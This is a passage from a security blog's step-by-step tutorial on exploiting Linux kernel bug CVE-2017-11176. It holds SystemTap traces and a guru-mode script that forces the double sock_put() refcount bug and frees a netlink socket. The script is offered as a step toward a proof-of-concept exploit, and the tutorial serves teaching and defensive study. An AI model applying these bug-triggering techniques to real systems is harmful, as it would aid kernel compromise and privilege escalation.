</code></pre></div><div class="highlight"><pre><span></span><code>-={ CVE-2017-11176 Exploit }=-
netlink socket created = 3
mq_notify: Bad file descriptor
exploit failed!

(3095-3095) [SYSCALL] ==&gt;&gt; mq_notify (-1, 0x7ffe5e528760)
(3095-3095) [uland] ==&gt;&gt; copy_from_user ()
(3095-3095) [skb] ==&gt;&gt; alloc_skb (priority=0xd0 size=0x20)
(3095-3095) [uland] ==&gt;&gt; copy_from_user ()
(3095-3095) [skb] ==&gt;&gt; skb_put (skb=0xffff88003f02cd00 len=0x20)
(3095-3095) [skb] &lt;&lt;== skb_put = ffff88003144ac00
(3095-3095) [vfs] ==&gt;&gt; fget (fd=0x3)
(3095-3095) [vfs] &lt;&lt;== fget = ffff880031475480
(3095-3095) [netlink] ==&gt;&gt; netlink_getsockbyfilp (filp=0xffff880031475480)
(3095-3095) [netlink] &lt;&lt;== netlink_getsockbyfilp = ffff88003cf56800
(3095-3095) [netlink] ==&gt;&gt; netlink_attachskb (sk=0xffff88003cf56800 skb=0xffff88003f02cd00 timeo=0xffff88002d79ff40 ssk=0x0)
-={ dump_netlink_sock: 0xffff88003cf56800 }=-
- sk = 0xffff88003cf56800
- sk-&gt;sk_rmem_alloc = 0
- sk-&gt;sk_rcvbuf = 133120
- sk-&gt;sk_refcnt = 2
- (before) nlk-&gt;state = 0
- (after) nlk-&gt;state = 1
- sk-&gt;sk_flags = 100
- SOCK_DEAD = 0
- sk-&gt;sk_flags = 101
-={ dump_netlink_sock: END}=-
!!&gt;&gt;&gt; REMOVING FD=3 FROM FDT &lt;&lt;&lt;!!
(3095-3095) [netlink] &lt;&lt;== netlink_attachskb = 1        // &lt;-----
(3095-3095) [vfs] ==&gt;&gt; fget (fd=0x3)
(3095-3095) [vfs] &lt;&lt;== fget = 0                         // &lt;-----
(3095-3095) [netlink] ==&gt;&gt; netlink_detachskb (sk=0xffff88003cf56800 skb=0xffff88003f02cd00)
(3095-3095) [netlink] &lt;&lt;== netlink_detachskb
(3095-3095) [SYSCALL] &lt;&lt;== mq_notify= -9
</code></pre></div><p>Very nice, the kernel goes out of the infinite loop we introduced. In addition, we are getting closer and closer to our attack scenario:</p><ol><li><em>netlink_attachskb()</em> returned 1</li><li>the second <em>fget()</em> call returned NULL</li></ol><p>So... Did we trigger the bug?</p><h2 id="checking-the-refcounter-status">Checking the refcounter status</h2><p>Since everything went according to our plan, the bug should be triggered and the <em>sock</em> refcounter should be decreased twice. Let's check it.</p><p>During <em>exit probe</em>, it is not possible to retrieve the parameters of the <em>enter probe</em>. It means that we can't check the content of <em>sock</em> while returning from <em>netlink_attachskb()</em>.</p><p>One way to do this is to store the <em>sock</em> pointer returned by <em>netlink_getsockbyfilp()</em> in a global variable (<em>sock_ptr</em> in the script). Then dump its content using our embedded "C" code with <em>dump_netlink_sock()</em>:</p><div class="highlight"><pre><span></span><code>    global <span class="nv">sock_ptr</span> <span class="o">=</span> <span class="m">0</span><span class="p">;</span>                  // &lt;------ declared globally!

    probe syscall.mq_notify.return
    <span class="o">{</span>
      <span class="k">if</span> <span class="o">(</span>execname<span class="o">()</span> <span class="o">==</span> <span class="s2">"exploit"</span><span class="o">)</span>
      <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span>sock_ptr !<span class="o">=</span> <span class="m">0</span><span class="o">)</span>                // &lt;----- watch your NULL-deref, this is kernel-land!
        <span class="o">{</span>
          dump_netlink_sock<span class="o">(</span>sock_ptr<span class="o">)</span><span class="p">;</span>
          <span class="nv">sock_ptr</span> <span class="o">=</span> <span class="m">0</span><span class="p">;</span>
        <span class="o">}</span>

        printf<span class="o">(</span><span class="s2">"(%d-%d) [SYSCALL] &lt;&lt;== mq_notify= %d\n\n"</span>, pid<span class="o">()</span>, tid<span class="o">()</span>, <span class="nv">$return</span><span class="o">)</span>
      <span class="o">}</span>
    <span class="o">}</span>

    probe kernel.function <span class="o">(</span><span class="s2">"netlink_getsockbyfilp"</span><span class="o">)</span>.return
    <span class="o">{</span>
      <span class="k">if</span> <span class="o">(</span>execname<span class="o">()</span> <span class="o">==</span> <span class="s2">"exploit"</span><span class="o">)</span>
      <span class="o">{</span>
        printf<span class="o">(</span><span class="s2">"(%d-%d) [netlink] &lt;&lt;== netlink_getsockbyfilp = %x\n"</span>, pid<span class="o">()</span>, tid<span class="o">()</span>, <span class="nv">$return</span><span class="o">)</span>
        <span class="nv">sock_ptr</span> <span class="o">=</span> <span class="nv">$return</span><span class="p">;</span>                 // &lt;----- store it
      <span class="o">}</span>
    <span class="o">}</span>
</code></pre></div><p>Run it again!</p><div class="highlight"><pre><span></span><code>(3391-3391) [SYSCALL] ==&gt;&gt; mq_notify (-1, 0x7ffe8f78c840)
(3391-3391) [uland] ==&gt;&gt; copy_from_user ()
(3391-3391) [skb] ==&gt;&gt; alloc_skb (priority=0xd0 size=0x20)
(3391-3391) [uland] ==&gt;&gt; copy_from_user ()
(3391-3391) [skb] ==&gt;&gt; skb_put (skb=0xffff88003d20cd00 len=0x20)
(3391-3391) [skb] &lt;&lt;== skb_put = ffff88003df9dc00
(3391-3391) [vfs] ==&gt;&gt; fget (fd=0x3)
(3391-3391) [vfs] &lt;&lt;== fget = ffff88003d84ed80
(3391-3391) [netlink] ==&gt;&gt; netlink_getsockbyfilp (filp=0xffff88003d84ed80)
(3391-3391) [netlink] &lt;&lt;== netlink_getsockbyfilp = ffff88002d72d800
(3391-3391) [netlink] ==&gt;&gt; netlink_attachskb (sk=0xffff88002d72d800 skb=0xffff88003d20cd00 timeo=0xffff8800317a7f40 ssk=0x0)
-={ dump_netlink_sock: 0xffff88002d72d800 }=-
- sk = 0xffff88002d72d800
- sk-&gt;sk_rmem_alloc = 0
- sk-&gt;sk_rcvbuf = 133120
- sk-&gt;sk_refcnt = 2               // &lt;------------
- (before) nlk-&gt;state = 0
- (after) nlk-&gt;state = 1
- sk-&gt;sk_flags = 100
- SOCK_DEAD = 0
- sk-&gt;sk_flags = 101
-={ dump_netlink_sock: END}=-
!!&gt;&gt;&gt; REMOVING FD=3 FROM FDT &lt;&lt;&lt;!!
(3391-3391) [netlink] &lt;&lt;== netlink_attachskb = 1
(3391-3391) [vfs] ==&gt;&gt; fget (fd=0x3)
(3391-3391) [vfs] &lt;&lt;== fget = 0
(3391-3391) [netlink] ==&gt;&gt; netlink_detachskb (sk=0xffff88002d72d800 skb=0xffff88003d20cd00)
(3391-3391) [netlink] &lt;&lt;== netlink_detachskb
-={ dump_netlink_sock: 0xffff88002d72d800 }=-
- sk = 0xffff88002d72d800
- sk-&gt;sk_rmem_alloc = 0
- sk-&gt;sk_rcvbuf = 133120
- sk-&gt;sk_refcnt = 0               // &lt;-------------
- (before) nlk-&gt;state = 1
- (after) nlk-&gt;state = 1
- sk-&gt;sk_flags = 101
- SOCK_DEAD = 0
- sk-&gt;sk_flags = 101
-={ dump_netlink_sock: END}=-
(3391-3391) [SYSCALL] &lt;&lt;== mq_notify= -9
</code></pre></div><p>As we can see, the <em>sk-&gt;sk_refcnt</em> has been decreased twice! We successfully triggered the bug.</p><p>Because the <em>sock</em>'s refcounter reaches zero, it means the <em>struct netlink_sock</em> object will be free. Let's add some other probes:</p><div class="highlight"><pre><span></span><code>... cut ...

(13560-13560) [netlink] &lt;&lt;== netlink_attachskb = 1
(13560-13560) [vfs] ==&gt;&gt; fget (fd=0x3)
(13560-13560) [vfs] &lt;&lt;== fget = 0
(13560-13560) [netlink] ==&gt;&gt; netlink_detachskb (sk=0xffff88002d7e5c00 skb=0xffff88003d2c1440)
(13560-13560) [kmem] ==&gt;&gt; kfree (objp=0xffff880033fd0000)
(13560-13560) [kmem] &lt;&lt;== kfree = 
(13560-13560) [sk] ==&gt;&gt; sk_free (sk=0xffff88002d7e5c00)
(13560-13560) [sk] ==&gt;&gt; __sk_free (sk=0xffff88002d7e5c00)
(13560-13560) [kmem] ==&gt;&gt; kfree (objp=0xffff88002d7e5c00) // &lt;---- freeing "sock"
(13560-13560) [kmem] &lt;&lt;== kfree = 
(13560-13560) [sk] &lt;&lt;== __sk_free = 
(13560-13560) [sk] &lt;&lt;== sk_free = 
(13560-13560) [netlink] &lt;&lt;== netlink_detachskb
</code></pre></div><p>The sock object is freed but we don't see any <em>use-after-free</em>...</p><h2 id="why-it-did-not-crash">Why it did not crash?</h2><p>Unlike our original plan, the <em>netlink_sock</em> object is freed by <em>netlink_detachskb()</em>. The reason is <strong>we don't call <em>close()</em></strong> (we only reset the FDT entry to NULL). That is, the file object is actually not released and so, it does not drop its reference of the <em>netlink_sock</em> object. In other words, we are missing a reference counter decrease.</p><p>It's all right, what we wanted to validate here was that the refcounter was decreased twice (one by <em>netlink_attachskb()</em> and one by <em>netlink_detachskb()</em>), which is the case.</p><p>In the normal course of operation (i.e. we call <em>close()</em>), this additional refcounter decrease will occur and <em>netlink_detachskb()</em> will do a UAF. We will even "delay" this use-after-free to a later moment to get a better control (cf. part 2).</p><h2 id="the-final-system-tap-script">The final System Tap script</h2><p>In the end, the whole system tap script that triggers the bug from kernel-land can be simplified into this:</p><div class="highlight"><pre><span></span><code><span class="c1"># mq_notify_force_crash.stp</span>
<span class="c1">#</span>
<span class="c1"># Run it with "stap -v -g ./mq_notify_force_crash.stp" (guru mode)</span>

%<span class="o">{</span>
<span class="c1">#include &lt;net/sock.h&gt;</span>
<span class="c1">#include &lt;net/netlink_sock.h&gt;</span>
<span class="c1">#include &lt;linux/fdtable.h&gt;</span>
%<span class="o">}</span>

<span class="k">function</span> force_trigger:long <span class="o">(</span>arg_sock:long<span class="o">)</span>
%<span class="o">{</span>
  struct sock *sk <span class="o">=</span> <span class="o">(</span>void*<span class="o">)</span> STAP_ARG_arg_sock<span class="p">;</span>
  sk-&gt;sk_flags <span class="p">|</span><span class="o">=</span> <span class="o">(</span><span class="m">1</span> &lt;&lt; SOCK_DEAD<span class="o">)</span><span class="p">;</span> // avoid blocking the thread

  struct netlink_sock *nlk <span class="o">=</span> <span class="o">(</span>void*<span class="o">)</span> sk<span class="p">;</span>
  nlk-&gt;state <span class="p">|</span><span class="o">=</span> <span class="m">1</span><span class="p">;</span>   // enter the netlink_attachskb<span class="o">()</span> retry path    

  struct files_struct *files <span class="o">=</span> current-&gt;files<span class="p">;</span>
  struct fdtable *fdt <span class="o">=</span> files_fdtable<span class="o">(</span>files<span class="o">)</span><span class="p">;</span>
  fdt-&gt;fd<span class="o">[</span><span class="m">3</span><span class="o">]</span> <span class="o">=</span> NULL<span class="p">;</span> // makes the second call to fget<span class="o">()</span> fails
%<span class="o">}</span>

probe kernel.function <span class="o">(</span><span class="s2">"netlink_attachskb"</span><span class="o">)</span>
<span class="o">{</span>
  <span class="k">if</span> <span class="o">(</span>execname<span class="o">()</span> <span class="o">==</span> <span class="s2">"exploit"</span><span class="o">)</span>
  <span class="o">{</span>
    force_trigger<span class="o">(</span><span class="nv">$sk</span><span class="o">)</span><span class="p">;</span>
  <span class="o">}</span>
<span class="o">}</span>
</code></pre></div><p>Simple, isn't it?</p><h1 id="conclusion">Conclusion</h1><p>In this first article, the core kernel data structure, as well as, the refcounting facility has been introduced to the Linux Kernel newcomer. While studying public information (CVE description, patch), we got a better understanding of the bug and designed an attack scenario.</p><p>Then, we started developing the exploit and validated that the bug is actually reachable from an unprivileged user. Doing so, we introduced a great kernel tool: System Tap. We also encountered our first bug (library wrappers) and showed how to detect it.</p><p>With the help of System Tap's Guru Mode, we finally "forced" the trigger from the kernel-land and validated that we can reliably produce a double <em>sock_put()</em> bug. It exposed that three things were necessary to trigger the bug:</p><ol><li>Force <em>netlink_attachskb()</em> to return 1</li><li>Unblock the exploit thread</li><li>Force the second <em>fget()</em> call to return NULL</li></ol><p>In the next article, we will replace, one-by-one, each kernel modification introduced with System Tap. In fact, we will gradually build a proof-of-concept code that triggers the bug using userland code only.</p><p>We hope you enjoyed the journey in kernel land exploitation and see you soon in <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html">part 2</a>!</p></div><div class="blog-post-meta mt-4"><div class="share" id="post-share-links"><div class="share-twitter"><a href="https://twitter.com/intent/tweet?text=CVE-2017-11176%3A%20A%20step-by-step%20Linux%20Kernel%20exploitation%20%28part%201/4%29&amp;url=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html" rel="nofollow noopener" target="_blank"><span><svg aria-hidden="true" class="svg-inline--fa fa-twitter fa-w-16" data-prefix="fab" data-icon="twitter" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg><!-- <i aria-hidden="true" class="fab fa-twitter"></i> -->Tweet</span></a></div><div class="share-facebook"><a href="http://www.facebook.com/sharer/sharer.php?u=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html" rel="nofollow noopener" target="_blank"><span><svg aria-hidden="true" class="svg-inline--fa fa-facebook fa-w-14" data-prefix="fab" data-icon="facebook" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M448 56.7v398.5c0 13.7-11.1 24.7-24.7 24.7H309.1V306.5h58.2l8.7-67.6h-67v-43.2c0-19.6 5.4-32.9 33.5-32.9h35.8v-60.5c-6.2-.8-27.4-2.7-52.2-2.7-51.6 0-87 31.5-87 89.4v49.9h-58.4v67.6h58.4V480H24.7C11.1 480 0 468.9 0 455.3V56.7C0 43.1 11.1 32 24.7 32h398.5c13.7 0 24.8 11.1 24.8 24.7z"></path></svg><!-- <i aria-hidden="true" class="fab fa-facebook"></i> -->Share</span></a></div><div class="share-linkedin"><a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html&amp;title=CVE-2017-11176%3A%20A%20step-by-step%20Linux%20Kernel%20exploitation%20%28part%201/4%29&amp;summary=The%20first%20article%20covers%20an%20in-depth%20CVE/bug%20analysis%2C%20designs%20an%20attack%20scenario%20and%20starts%20implementing%20a%20PoC%20in%20ring-0%20with%20SystemTap.%20The%20core%20concept%20section%20focuses%20on%20file/socket%20related%20data%20structures%2C%20netlink%20and%20refcounters.&amp;source=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html" rel="nofollow noopener" target="_blank"><span><svg aria-hidden="true" class="svg-inline--fa fa-linkedin fa-w-14" data-prefix="fab" data-icon="linkedin" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg><!-- <i aria-hidden="true" class="fab fa-linkedin"></i> -->Share</span></a></div><div class="share-email"><a href="mailto:?subject=CVE-2017-11176%3A%20A%20step-by-step%20Linux%20Kernel%20exploitation%20%28part%201/4%29&amp;body=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html" rel="nofollow noopener" target="_blank"><span><svg aria-hidden="true" class="svg-inline--fa fa-envelope fa-w-16" data-prefix="far" data-icon="envelope" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M464 64H48C21.49 64 0 85.49 0 112v288c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm0 48v40.805c-22.422 18.259-58.168 46.651-134.587 106.49-16.841 13.247-50.201 45.072-73.413 44.701-23.208.375-56.579-31.459-73.413-44.701C106.18 199.465 70.425 171.067 48 152.805V112h416zM48 400V214.398c22.914 18.251 55.409 43.862 104.938 82.646 21.857 17.205 60.134 55.186 103.062 54.955 42.717.231 80.509-37.199 103.053-54.947 49.528-38.783 82.032-64.401 104.947-82.653V400H48z"></path></svg><!-- <i aria-hidden="true" class="far fa-envelope"></i> -->Share</span></a></div></div></div></div></article></div></main><footer class="container-fluid bg-white"><div class="row py-2" style="background-color: rgb(179,32,39);"><div class="col-12 text-center footer-text"><h3 class="text-light">LEXFO - Because information security is essential</h3></div></div><div class="row"><div class="col-12 text-center mt-3"><h3 class="txtcenter">Contact us</h3></div></div><div class="row mt-3"><div class="col-sm-3 text-center"><img alt="Adresse" class="mb-2" src="./2018 - CVE-2017-11176  A step-by-step Linux Kernel exploitation part  1_files/map.png"><h4>Our address</h4><address><p>5, rue Drouot<br> 75009 PARIS, FRANCE</p></address></div><div class="col-sm-3 text-center"><img alt="Email" class="mb-2" src="./2018 - CVE-2017-11176  A step-by-step Linux Kernel exploitation part  1_files/email.png"><h4>By email</h4><p>contact [at] lexfo [dot] fr</p></div><div class="col-sm-3 text-center"><img alt="Téléphone" class="mb-2" src="./2018 - CVE-2017-11176  A step-by-step Linux Kernel exploitation part  1_files/tel.png"><h4>By phone</h4><p>+33 1 40 17 91 28</p></div><div class="col-sm-3 text-center"><a href="https://twitter.com/LexfoSecurite" style="background: transparent;"><img alt="@LexfoSecurite, Lexfo&#39;s twitter account" class="mb-2" src="./2018 - CVE-2017-11176  A step-by-step Linux Kernel exploitation part  1_files/twitter.png"></a><h4>On Twitter</h4><p><a href="https://twitter.com/LexfoSecurite">@LexfoSecurite</a></p></div></div><div class="row mt-1"><div class="col-12 text-center"><p><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html#logo">Back to the top</a></p></div></div><div class="row mt-1"><div class="col-12 text-center"><p>© LEXFO 2020 - All rights reserved</p></div></div></footer><script src="./2018 - CVE-2017-11176  A step-by-step Linux Kernel exploitation part  1_files/packed.js.下載"></script><script src="./2018 - CVE-2017-11176  A step-by-step Linux Kernel exploitation part  1_files/all.min.js.下載"></script><script>
               $(document).ready(function () { $("table").attr("class","table table-condensed table-bordered"); });
               $(document).ready(function () { $("figcaption").attr("class","figcaption figure-caption text-center"); });
        </script></body></html>